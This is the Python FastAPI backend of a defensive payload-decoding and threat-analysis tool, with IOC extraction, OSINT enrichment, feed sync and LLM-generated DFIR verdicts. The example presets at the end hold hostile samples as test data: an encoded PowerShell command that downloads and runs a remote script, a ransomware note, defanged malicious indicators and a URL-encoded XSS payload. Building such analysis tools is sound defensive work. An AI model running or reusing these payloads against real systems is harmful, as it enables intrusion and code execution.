"""NivXRay — FastAPI backend."""
from __future__ import annotations
import os
import re
import json
import base64
import logging
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional

import bcrypt
import jwt
import asyncio
from dotenv import load_dotenv
from fastapi import FastAPI, APIRouter, HTTPException, Depends, UploadFile, File
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from pydantic import BaseModel, Field, EmailStr

from operations import (
    OPERATIONS, list_operations, run_operation,
    extract_iocs, detect_payload_type, mitre_map, yara_lite_scan, risk_score,
)
from smart_decoder import smart_decode
from osint import enrich_iocs, OSINT_SERVICES
from feeds import SOURCES as FEED_SOURCES, sync_source

from emergentintegrations.llm.chat import LlmChat, UserMessage

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / ".env")

MONGO_URL = os.environ["MONGO_URL"]
DB_NAME = os.environ["DB_NAME"]
JWT_SECRET = os.environ["JWT_SECRET"]
ADMIN_EMAIL = os.environ["ADMIN_EMAIL"]
ADMIN_PASSWORD = os.environ["ADMIN_PASSWORD"]
EMERGENT_LLM_KEY = os.environ["EMERGENT_LLM_KEY"]

JWT_ALG = "HS256"
JWT_EXPIRE_HOURS = 24 * 7

client = AsyncIOMotorClient(MONGO_URL)
db = client[DB_NAME]

app = FastAPI(title="NivXRay API")
api = APIRouter(prefix="/api")
security = HTTPBearer()

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("nivxray")


# =============================================================================
# Models
# =============================================================================
class LoginIn(BaseModel):
    email: EmailStr
    password: str


class TokenOut(BaseModel):
    access_token: str
    token_type: str = "bearer"
    email: str


class RecipeStep(BaseModel):
    op: str
    args: Dict[str, Any] = Field(default_factory=dict)


class RunRecipeIn(BaseModel):
    input: str
    steps: List[RecipeStep] = Field(default_factory=list)


class RunRecipeOut(BaseModel):
    output: str
    steps_output: List[Dict[str, Any]] = Field(default_factory=list)
    detected_type: Optional[Dict[str, str]] = None
    errors: List[Dict[str, str]] = Field(default_factory=list)


class AutoIn(BaseModel):
    input: str


class AnalyzeIn(BaseModel):
    input: str
    output: Optional[str] = None
    use_ai_verdict: bool = False
    enrich_osint: bool = True
    describe: bool = False


class TroubleshootIn(BaseModel):
    input: str
    steps: List[RecipeStep] = Field(default_factory=list)
    error: Optional[str] = None


class ShareIn(BaseModel):
    input: str
    steps: List[RecipeStep] = Field(default_factory=list)


class SettingsUpdateIn(BaseModel):
    keys: Dict[str, str] = Field(default_factory=dict)  # {service_id: api_key}


# =============================================================================
# Auth
# =============================================================================
def _hash_password(pw: str) -> str:
    return bcrypt.hashpw(pw.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")


def _verify_password(pw: str, hashed: str) -> bool:
    try:
        return bcrypt.checkpw(pw.encode("utf-8"), hashed.encode("utf-8"))
    except Exception:
        return False


def _create_token(email: str) -> str:
    payload = {
        "sub": email,
        "iat": datetime.now(timezone.utc),
        "exp": datetime.now(timezone.utc) + timedelta(hours=JWT_EXPIRE_HOURS),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALG)


async def get_current_user(creds: HTTPAuthorizationCredentials = Depends(security)) -> Dict[str, Any]:
    try:
        payload = jwt.decode(creds.credentials, JWT_SECRET, algorithms=[JWT_ALG])
        email = payload.get("sub")
        if not email:
            raise HTTPException(status_code=401, detail="Invalid token")
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="Invalid or expired token")
    user = await db.users.find_one({"email": email}, {"_id": 0, "password": 0})
    if not user:
        raise HTTPException(status_code=401, detail="User not found")
    return user


async def require_admin(user=Depends(get_current_user)) -> Dict[str, Any]:
    if user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Admin access required")
    return user


async def seed_admin():
    existing = await db.users.find_one({"email": ADMIN_EMAIL})
    if existing:
        return
    await db.users.insert_one({
        "email": ADMIN_EMAIL,
        "password": _hash_password(ADMIN_PASSWORD),
        "role": "admin",
        "created_at": datetime.now(timezone.utc).isoformat(),
    })
    log.info(f"Seeded admin user: {ADMIN_EMAIL}")


# =============================================================================
# Settings
# =============================================================================
async def load_osint_keys() -> Dict[str, str]:
    doc = await db.settings.find_one({"_id": "osint_keys"}) or {}
    return doc.get("keys", {})


def _mask(v: str) -> str:
    if not v: return ""
    if len(v) <= 8: return "•" * len(v)
    return v[:4] + "•" * max(4, len(v) - 8) + v[-4:]


# =============================================================================
# LLM helpers
# =============================================================================
def _new_chat(session_id: str, system: str) -> LlmChat:
    return LlmChat(
        api_key=EMERGENT_LLM_KEY,
        session_id=session_id,
        system_message=system,
    ).with_model("anthropic", "claude-sonnet-4-5-20250929")


async def _llm_json(session_id: str, system: str, user: str, retries: int = 1) -> Dict[str, Any]:
    chat = _new_chat(session_id, system)
    last_err = None
    for _ in range(retries + 1):
        try:
            resp = await chat.send_message(UserMessage(text=user))
            raw = resp if isinstance(resp, str) else str(resp)
            cleaned = raw.strip()
            m = re.search(r"```(?:json)?\s*(.*?)\s*```", cleaned, re.DOTALL)
            if m: cleaned = m.group(1)
            if not cleaned.lstrip().startswith("{"):
                m2 = re.search(r"\{.*\}", cleaned, re.DOTALL)
                if m2: cleaned = m2.group(0)
            return json.loads(cleaned)
        except Exception as e:
            last_err = e
    raise HTTPException(status_code=502, detail=f"LLM JSON parse failed: {last_err}")


async def _llm_text(session_id: str, system: str, user: str) -> str:
    chat = _new_chat(session_id, system)
    try:
        r = await chat.send_message(UserMessage(text=user))
        return r if isinstance(r, str) else str(r)
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"LLM error: {e}")


# =============================================================================
# Endpoints — Auth
# =============================================================================
@api.get("/")
async def root():
    return {"service": "NivXRay", "status": "ok"}


@api.post("/auth/login", response_model=TokenOut)
async def login(body: LoginIn):
    u = await db.users.find_one({"email": body.email})
    if not u or not _verify_password(body.password, u["password"]):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    return TokenOut(access_token=_create_token(body.email), email=body.email)


@api.get("/auth/me")
async def me(user=Depends(get_current_user)):
    return user


# =============================================================================
# Endpoints — Operations & Recipes
# =============================================================================
@api.get("/operations")
async def get_ops(user=Depends(get_current_user)):
    return list_operations()


@api.get("/examples")
async def get_examples(user=Depends(get_current_user)):
    return EXAMPLES


@api.post("/recipe/run", response_model=RunRecipeOut)
async def run_recipe(body: RunRecipeIn, user=Depends(get_current_user)):
    current = body.input
    steps_output: List[Dict[str, Any]] = []
    errors: List[Dict[str, str]] = []
    for i, step in enumerate(body.steps):
        try:
            current = run_operation(step.op, current, step.args)
            steps_output.append({
                "index": i, "op": step.op,
                "output_preview": current[:400],
                "output_length": len(current),
            })
        except Exception as e:
            errors.append({"index": str(i), "op": step.op, "error": str(e)})
            steps_output.append({"index": i, "op": step.op, "error": str(e)})
            break
    return RunRecipeOut(
        output=current, steps_output=steps_output,
        detected_type=detect_payload_type(current), errors=errors,
    )


@api.post("/upload")
async def upload(file: UploadFile = File(...), user=Depends(get_current_user)):
    raw = await file.read()
    try:
        text = raw.decode("utf-8")
    except UnicodeDecodeError:
        text = raw.hex()
    return {"filename": file.filename, "size": len(raw), "content": text[:200_000]}


# =============================================================================
# Endpoints — Smart deterministic Auto-Decode (no AI needed)
# =============================================================================
@api.post("/decode/smart")
async def decode_smart(body: AutoIn, user=Depends(get_current_user)):
    result = smart_decode(body.input)
    return {
        "recipe": [{"op": s["op"], "args": s.get("args", {}), "reason": s["reason"]} for s in result["steps"]],
        "output": result["output"],
        "notes": result["notes"],
        "detected_type": detect_payload_type(result["output"]),
    }


# =============================================================================
# Endpoints — Threat Analysis
# =============================================================================
@api.post("/analyze")
async def analyze(body: AnalyzeIn, user=Depends(get_current_user)):
    text = (body.output or "") + "\n" + body.input
    iocs = extract_iocs(text)
    mitre = mitre_map(text)
    yara = yara_lite_scan(text)
    risk = risk_score(mitre, yara, iocs)

    # cross-reference against local threat-intel database
    ti_hits = await _lookup_ti_hits(iocs)

    osint_data = None
    if body.enrich_osint:
        try:
            keys = await load_osint_keys()
            osint_data = await enrich_iocs(iocs, keys)
        except Exception as e:
            osint_data = {"error": str(e)}

    ai_verdict = None
    description = None
    if body.use_ai_verdict or body.describe:
        try:
            ai_bundle = await _ai_describe_and_verdict(
                body.input, body.output or "", iocs, mitre, yara, osint_data or {},
                want_verdict=body.use_ai_verdict, want_describe=body.describe,
            )
            ai_verdict = ai_bundle.get("verdict") if body.use_ai_verdict else None
            description = ai_bundle.get("description") if body.describe else None
        except Exception as e:
            if body.use_ai_verdict: ai_verdict = {"error": str(e)}
            if body.describe: description = {"error": str(e)}

    return {
        "iocs": iocs, "mitre": mitre, "yara": yara, "risk": risk,
        "osint": osint_data, "ti_hits": ti_hits,
        "ai_verdict": ai_verdict, "description": description,
    }


async def _lookup_ti_hits(iocs: Dict[str, List[str]]) -> List[Dict[str, Any]]:
    """Cross-reference extracted IOCs against local Threat-Intel DB."""
    values: List[str] = []
    for k in ("urls", "ips", "domains", "md5", "sha1", "sha256"):
        values.extend(iocs.get(k) or [])
    if not values:
        return []
    hits = []
    async for doc in db.iocs.find({"value": {"$in": values}}, {"_id": 0}):
        hits.append(doc)
    return hits


async def _ai_describe_and_verdict(inp, out, iocs, mitre, yara, osint, want_verdict, want_describe):
    """Single LLM call producing rich narrative description + verdict JSON."""
    parts = []
    if want_describe:
        parts.append(
            '"description": {\n'
            '  "summary": "2-3 sentence executive summary of what the decoded script/command does",\n'
            '  "behavior": ["bullet points describing each behavior observed"],\n'
            '  "ioc_narrative": "1-2 paragraph narrative discussing extracted IOCs, referencing OSINT enrichment where present (geolocation, VT verdict, AbuseIPDB score, Shodan open ports, etc.). Be specific with values.",\n'
            '  "attribution_hints": "any hints about actor/family/tooling",\n'
            '  "recommended_actions": ["array of concrete containment / IR actions"]\n'
            '}'
        )
    if want_verdict:
        parts.append(
            '"verdict": {\n'
            '  "verdict": "Malicious|Suspicious|Benign",\n'
            '  "confidence": 0-100,\n'
            '  "summary": "1-2 sentence rationale",\n'
            '  "key_findings": ["short strings"],\n'
            '  "recommended_actions": ["short strings"]\n'
            '}'
        )
    schema = "{\n" + ",\n".join(parts) + "\n}"

    system = (
        "You are a senior DFIR analyst reviewing a decoded payload. "
        "Write like an incident-report analyst: precise, factual, technical, cite specific IOC values / OSINT results.\n"
        "Return STRICT JSON only with the keys shown in the schema. No markdown, no prose outside JSON."
    )
    prompt = (
        f"SCHEMA:\n{schema}\n\n"
        f"RAW INPUT:\n{inp[:3500]}\n\n"
        f"DECODED OUTPUT:\n{out[:3500]}\n\n"
        f"EXTRACTED IOCs:\n{json.dumps(iocs)[:2000]}\n\n"
        f"HEURISTIC MITRE:\n{json.dumps(mitre)[:1200]}\n\n"
        f"HEURISTIC YARA:\n{json.dumps(yara)[:1200]}\n\n"
        f"OSINT ENRICHMENT:\n{json.dumps(osint)[:5000]}\n\n"
        "Return only JSON."
    )
    return await _llm_json("describe-" + str(datetime.now(timezone.utc).timestamp()), system, prompt)


# =============================================================================
# Endpoints — AI (Auto Decode / Auto Investigate / Troubleshoot)
# =============================================================================
_OP_IDS = sorted(OPERATIONS.keys())


@api.post("/ai/auto-decode")
async def ai_auto_decode(body: AutoIn, user=Depends(get_current_user)):
    """AI plans a recipe, executes it locally, and returns the final output.
    If the AI plan fails, falls back to deterministic smart_decode.
    """
    system = (
        "You are an expert malware analyst using a CyberChef-like tool. "
        "Given an obfuscated / encoded payload, produce a JSON recipe of operations that will fully decode it.\n"
        f"AVAILABLE OPERATION IDS: {_OP_IDS}\n"
        "Return STRICT JSON only with keys: reasoning (short string), steps (array of {op, args}).\n"
        "Args optional. Only use ids from AVAILABLE OPERATION IDS. Max 8 steps."
    )
    prompt = f"PAYLOAD:\n{body.input[:4000]}\n\nReturn only JSON."
    try:
        plan = await _llm_json("autodecode-" + str(datetime.now(timezone.utc).timestamp()), system, prompt)
    except HTTPException:
        plan = {"reasoning": "AI unavailable — falling back to deterministic smart decoder.", "steps": []}

    steps = []
    for s in (plan.get("steps") or [])[:8]:
        if s.get("op") in OPERATIONS:
            steps.append(RecipeStep(op=s["op"], args=s.get("args") or {}))

    if not steps:
        det = smart_decode(body.input)
        steps = [RecipeStep(op=x["op"], args=x.get("args", {})) for x in det["steps"]]
        plan.setdefault("reasoning", "Used deterministic smart decoder (no AI plan).")

    result = await run_recipe(RunRecipeIn(input=body.input, steps=steps), user=user)
    return {
        "reasoning": plan.get("reasoning", ""),
        "recipe": [s.model_dump() for s in steps],
        "output": result.output,
        "steps_output": result.steps_output,
        "detected_type": result.detected_type,
        "errors": result.errors,
    }


@api.post("/ai/auto-investigate")
async def ai_auto_investigate(body: AutoIn, user=Depends(get_current_user)):
    """Auto Decode + full Analyze (OSINT + AI describe + AI verdict) in one shot."""
    dec = await ai_auto_decode(body, user=user)
    analysis = await analyze(AnalyzeIn(
        input=body.input, output=dec["output"],
        use_ai_verdict=True, describe=True, enrich_osint=True,
    ), user=user)
    return {**dec, "analysis": analysis}


@api.post("/ai/troubleshoot")
async def ai_troubleshoot(body: TroubleshootIn, user=Depends(get_current_user)):
    system = (
        "You are a DFIR analyst helping troubleshoot a stuck decoding recipe. "
        "Given the input, the recipe applied, and any error, explain what went wrong (1-3 sentences) "
        "and propose a fixed recipe.\n"
        f"AVAILABLE OPERATION IDS: {_OP_IDS}\n"
        "Return STRICT JSON: {diagnosis: string, suggested_steps: [{op, args}]}. Max 8 steps."
    )
    prompt = (
        f"INPUT:\n{body.input[:3000]}\n\n"
        f"CURRENT RECIPE: {json.dumps([s.model_dump() for s in body.steps])}\n\n"
        f"ERROR: {body.error or 'no error - output looks wrong'}\n\nReturn only JSON."
    )
    result = await _llm_json("troubleshoot-" + str(datetime.now(timezone.utc).timestamp()), system, prompt)
    fixed = [{"op": s["op"], "args": s.get("args") or {}} for s in (result.get("suggested_steps") or [])[:8] if s.get("op") in OPERATIONS]
    return {"diagnosis": result.get("diagnosis", ""), "suggested_steps": fixed}


# =============================================================================
# Share / Report
# =============================================================================
@api.post("/share")
async def create_share(body: ShareIn, user=Depends(get_current_user)):
    payload = json.dumps({"input": body.input, "steps": [s.model_dump() for s in body.steps]}).encode("utf-8")
    token = base64.urlsafe_b64encode(payload).decode("utf-8").rstrip("=")
    await db.shares.insert_one({
        "token": token, "input_len": len(body.input),
        "steps": [s.model_dump() for s in body.steps],
        "created_by": user["email"],
        "created_at": datetime.now(timezone.utc).isoformat(),
    })
    return {"token": token}


@api.get("/share/{token}")
async def get_share(token: str):
    padded = token + "=" * (-len(token) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(padded).decode("utf-8"))
    except Exception:
        raise HTTPException(status_code=404, detail="Invalid share token")


@api.post("/report")
async def build_report(body: AnalyzeIn, user=Depends(get_current_user)):
    text = (body.output or "") + "\n" + body.input
    iocs = extract_iocs(text)
    mitre = mitre_map(text)
    yara = yara_lite_scan(text)
    risk = risk_score(mitre, yara, iocs)
    ts = datetime.now(timezone.utc).isoformat()
    lines = [
        "NIVXRAY — DECODER & THREAT ANALYSIS REPORT",
        f"Generated: {ts}",
        f"Analyst:   {user['email']}",
        "=" * 60,
        "",
        f"VERDICT:   {risk['verdict']}   (score {risk['score']}/100)",
        "",
        "INPUT (first 400 chars):",
        (body.input or "")[:400],
        "",
        "DECODED OUTPUT (first 1000 chars):",
        (body.output or "")[:1000],
        "",
        "MITRE ATT&CK:",
    ]
    for m in mitre:
        lines.append(f"  - {m['id']}  {m['technique']}   [{m['tactic']}]")
    if not mitre:
        lines.append("  (no techniques matched)")
    lines += ["", "YARA-LITE HITS:"]
    for y in yara:
        lines.append(f"  - [{y['severity'].upper()}] {y['rule']}: {y['description']}")
    if not yara:
        lines.append("  (no rule hits)")
    lines += ["", "IOCs:"]
    for k, v in iocs.items():
        if v:
            lines.append(f"  {k}:")
            for item in v:
                lines.append(f"    - {item}")
    lines += ["", "=" * 60, "End of report."]
    return {"report": "\n".join(lines), "filename": f"nivxray_report_{int(datetime.now().timestamp())}.txt"}


# =============================================================================
# Admin — Settings (OSINT API Keys) + Users listing
# =============================================================================
@api.get("/admin/osint/services")
async def get_osint_services(user=Depends(require_admin)):
    keys = await load_osint_keys()
    return [
        {**s, "configured": bool(keys.get(s["id"])), "masked_key": _mask(keys.get(s["id"], ""))}
        for s in OSINT_SERVICES
    ]


@api.put("/admin/osint/settings")
async def update_osint_settings(body: SettingsUpdateIn, user=Depends(require_admin)):
    existing = await load_osint_keys()
    merged = {**existing}
    for svc_id, key in body.keys.items():
        if svc_id not in [s["id"] for s in OSINT_SERVICES]:
            continue
        # empty string => remove; otherwise set
        if key == "":
            merged.pop(svc_id, None)
        else:
            merged[svc_id] = key.strip()
    await db.settings.update_one(
        {"_id": "osint_keys"},
        {"$set": {"keys": merged, "updated_by": user["email"], "updated_at": datetime.now(timezone.utc).isoformat()}},
        upsert=True,
    )
    return {"ok": True, "configured_services": [k for k, v in merged.items() if v]}


@api.post("/admin/osint/test/{service_id}")
async def test_osint(service_id: str, user=Depends(require_admin)):
    keys = await load_osint_keys()
    key = keys.get(service_id)
    if not key:
        raise HTTPException(status_code=400, detail=f"No API key configured for {service_id}")
    # dispatch a minimal test
    import httpx
    async with httpx.AsyncClient(timeout=8.0, headers={"User-Agent": "NivXRay/1.0"}) as c:
        try:
            if service_id == "virustotal":
                r = await c.get("https://www.virustotal.com/api/v3/ip_addresses/8.8.8.8", headers={"x-apikey": key})
            elif service_id == "abuseipdb":
                r = await c.get("https://api.abuseipdb.com/api/v2/check",
                                headers={"Key": key, "Accept": "application/json"},
                                params={"ipAddress": "8.8.8.8", "maxAgeInDays": 30})
            elif service_id == "shodan":
                r = await c.get("https://api.shodan.io/api-info", params={"key": key})
            elif service_id == "greynoise":
                r = await c.get("https://api.greynoise.io/v3/community/8.8.8.8", headers={"key": key})
            elif service_id == "urlscan":
                r = await c.get("https://urlscan.io/user/quotas/", headers={"API-Key": key})
            elif service_id == "otx":
                r = await c.get("https://otx.alienvault.com/api/v1/user/me", headers={"X-OTX-API-KEY": key})
            elif service_id == "ipinfo":
                r = await c.get("https://ipinfo.io/8.8.8.8", params={"token": key})
            elif service_id == "hybrid_analysis":
                r = await c.get("https://www.hybrid-analysis.com/api/v2/key/current",
                                headers={"api-key": key, "user-agent": "Falcon Sandbox"})
            else:
                raise HTTPException(status_code=400, detail="Unknown service")
            return {"ok": r.status_code < 400, "status_code": r.status_code, "body_snippet": r.text[:200]}
        except HTTPException:
            raise
        except Exception as e:
            return {"ok": False, "error": str(e)}


@api.get("/admin/users")
async def list_users(user=Depends(require_admin)):
    users = await db.users.find({}, {"_id": 0, "password": 0}).to_list(50)
    return users


@api.get("/admin/stats")
async def admin_stats(user=Depends(require_admin)):
    total_shares = await db.shares.count_documents({})
    total_users = await db.users.count_documents({})
    total_iocs = await db.iocs.count_documents({})
    keys = await load_osint_keys()
    return {
        "total_shares": total_shares,
        "total_users": total_users,
        "total_iocs": total_iocs,
        "configured_osint_services": len([v for v in keys.values() if v]),
        "total_operations": len(OPERATIONS),
    }


# =============================================================================
# Threat Intelligence — IOC Database & bulk-feed sync
# =============================================================================
async def _iocs_indexes():
    """Ensure indexes on the iocs collection."""
    try:
        await db.iocs.create_index([("kind", 1), ("value", 1), ("source", 1)], unique=True, name="uniq_ioc")
        await db.iocs.create_index([("source", 1)])
        await db.iocs.create_index([("severity", 1)])
        await db.iocs.create_index([("last_seen", -1)])
    except Exception:
        pass


@api.get("/threat-intel/sources")
async def ti_sources(user=Depends(get_current_user)):
    keys = await load_osint_keys()
    # per-source metadata (last sync, count)
    meta_docs = {m["_id"]: m async for m in db.ti_source_meta.find({})}
    out = []
    for s in FEED_SOURCES:
        needs = s.get("needs_key")
        configured = (needs is None) or bool(keys.get(needs))
        m = meta_docs.get(s["id"]) or {}
        out.append({
            **s,
            "configured": configured,
            "last_sync": m.get("last_sync"),
            "last_status": m.get("last_status"),
            "last_new": m.get("last_new", 0),
            "last_updated": m.get("last_updated", 0),
            "last_error": m.get("last_error"),
            "total_indicators": m.get("total_indicators", 0),
        })
    return out


@api.get("/threat-intel/stats")
async def ti_stats(user=Depends(get_current_user)):
    total = await db.iocs.count_documents({})
    critical = await db.iocs.count_documents({"severity": "critical"})
    high = await db.iocs.count_documents({"severity": "high"})
    medium = await db.iocs.count_documents({"severity": "medium"})
    low = await db.iocs.count_documents({"severity": "low"})
    by_kind = {}
    for k in ("ip", "domain", "url", "md5", "sha1", "sha256"):
        by_kind[k] = await db.iocs.count_documents({"kind": k})
    return {"total": total, "critical": critical, "high": high, "medium": medium, "low": low, "by_kind": by_kind}


async def _apply_iocs(iocs: List[Dict[str, Any]], source_id: str) -> Dict[str, int]:
    """Upsert a batch of IOC docs. Returns {'new': int, 'updated': int}."""
    new_count = 0
    upd_count = 0
    for doc in iocs:
        key = {"kind": doc["kind"], "value": doc["value"], "source": source_id}
        existing = await db.iocs.find_one(key, {"_id": 1})
        update = {
            "$set": {"severity": doc["severity"], "tags": doc["tags"], "extra": doc["extra"], "last_seen": doc["last_seen"]},
            "$setOnInsert": {"first_seen": doc["first_seen"]},
        }
        r = await db.iocs.update_one(key, update, upsert=True)
        if r.upserted_id is not None or existing is None:
            new_count += 1
        else:
            upd_count += 1
    return {"new": new_count, "updated": upd_count}


@api.post("/threat-intel/sync/{source_id}")
async def ti_sync_one(source_id: str, user=Depends(require_admin)):
    src = next((s for s in FEED_SOURCES if s["id"] == source_id), None)
    if not src:
        raise HTTPException(status_code=404, detail="Unknown source")
    if not src.get("bulk"):
        raise HTTPException(status_code=400, detail="This source is lookup-only (no bulk feed)")
    keys = await load_osint_keys()
    result = await sync_source(source_id, keys)
    ts = datetime.now(timezone.utc).isoformat()
    if result.get("error"):
        await db.ti_source_meta.update_one(
            {"_id": source_id},
            {"$set": {"last_sync": ts, "last_status": "error", "last_error": result["error"]}},
            upsert=True,
        )
        return {"ok": False, "error": result["error"], "source": source_id}
    counts = await _apply_iocs(result["iocs"], source_id)
    total = await db.iocs.count_documents({"source": source_id})
    await db.ti_source_meta.update_one(
        {"_id": source_id},
        {"$set": {"last_sync": ts, "last_status": "ok", "last_error": None,
                  "last_new": counts["new"], "last_updated": counts["updated"],
                  "total_indicators": total}},
        upsert=True,
    )
    return {"ok": True, "source": source_id, "fetched": len(result["iocs"]), **counts, "total_indicators": total}


@api.post("/threat-intel/sync-all")
async def ti_sync_all(user=Depends(require_admin)):
    keys = await load_osint_keys()
    bulk_sources = [s for s in FEED_SOURCES if s.get("bulk")]
    async def _one(src):
        return src["id"], await sync_source(src["id"], keys)
    results = await asyncio.gather(*[_one(s) for s in bulk_sources], return_exceptions=True)
    summary = []
    ts = datetime.now(timezone.utc).isoformat()
    for r in results:
        if isinstance(r, Exception):
            summary.append({"source": "?", "error": str(r), "ok": False})
            continue
        sid, res = r
        if res.get("error"):
            await db.ti_source_meta.update_one(
                {"_id": sid},
                {"$set": {"last_sync": ts, "last_status": "error", "last_error": res["error"]}},
                upsert=True,
            )
            summary.append({"source": sid, "ok": False, "error": res["error"]})
            continue
        counts = await _apply_iocs(res["iocs"], sid)
        total = await db.iocs.count_documents({"source": sid})
        await db.ti_source_meta.update_one(
            {"_id": sid},
            {"$set": {"last_sync": ts, "last_status": "ok", "last_error": None,
                      "last_new": counts["new"], "last_updated": counts["updated"],
                      "total_indicators": total}},
            upsert=True,
        )
        summary.append({"source": sid, "ok": True, "fetched": len(res["iocs"]), **counts, "total_indicators": total})
    return {"results": summary, "ts": ts}


@api.get("/threat-intel/iocs")
async def ti_iocs(user=Depends(get_current_user), q: str = "", kind: str = "", source: str = "", severity: str = "", limit: int = 100, skip: int = 0):
    query: Dict[str, Any] = {}
    if kind: query["kind"] = kind
    if source: query["source"] = source
    if severity: query["severity"] = severity
    if q:
        query["value"] = {"$regex": re.escape(q), "$options": "i"}
    cur = db.iocs.find(query, {"_id": 0}).sort("last_seen", -1).skip(max(0, skip)).limit(max(1, min(500, limit)))
    docs = await cur.to_list(limit)
    total = await db.iocs.count_documents(query)
    return {"total": total, "items": docs}


@api.get("/threat-intel/lookup/{value}")
async def ti_lookup(value: str, user=Depends(get_current_user)):
    """Return every stored IOC that matches this exact value (across all sources)."""
    docs = await db.iocs.find({"value": value}, {"_id": 0}).to_list(50)
    return {"value": value, "hits": docs}


# =============================================================================
# Load Example Presets
# =============================================================================
EXAMPLES = [
    {
        "id": "powershell-encoded",
        "label": "PowerShell -EncodedCommand",
        "input": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAvAHAALgBwAHMAMQAnACkA",
    },
    {
        "id": "ransomware-note",
        "label": "Ransomware Note",
        "input": "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\nAll your important documents, photos, databases and other files have been encrypted with military-grade AES-256.\n\nTo restore your files you must pay 0.75 BTC to the following address within 72 hours:\n\nBTC ADDRESS: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\nContact us via Tor: http://ransomxyz1abcdef23456789ghijklmn.onion\nEmail: recover-your-files@protonmail.com\n\nDo NOT rename encrypted files. Do NOT try to decrypt with third-party software.\n",
    },
    {
        "id": "defanged-iocs",
        "label": "Defanged IOCs Bundle",
        "input": "IOC dump from IR ticket #4421:\n\nURLs:\n  hxxps://malicious-cdn[.]example[.]com/payload[.]exe\n  hxxp://phish[.]login-microsoft-secure[.]net/auth\n\nIPs:\n  185[.]220[.]101[.]45\n  45[.]137[.]21[.]9\n\nEmails:\n  attacker[@]evilcorp[.]ru\n  admin[@]phish[.]login-microsoft-secure[.]net\n\nHashes:\n  MD5:    e10adc3949ba59abbe56e057f20f883e\n  SHA256: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\n",
    },
    {
        "id": "nested-base64-gzip",
        "label": "Nested Base64 → gzip",
        "input": "H4sIAIQ5VWoC/xXKyRWAIAwFwFZ+A3ryWYkNBBIRF4LEvXr1PNMNgnWPfoIreib0emHcl2zQQwq2j2d6brCGGt0QDZnuWYlxkiE8MVdel1zETPjvCY5M2qaS5JWF6xdjITdRYgAAAA==",
    },
    {
        "id": "url-encoded-xss",
        "label": "URL-encoded XSS",
        "input": "%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2Fscript%3E",
    },
]


# =============================================================================
# App wiring
# =============================================================================
app.include_router(api)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get("CORS_ORIGINS", "*").split(","),
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.on_event("startup")
async def _startup():
    await seed_admin()
    await _iocs_indexes()


@app.on_event("shutdown")
async def _shutdown():
    client.close()
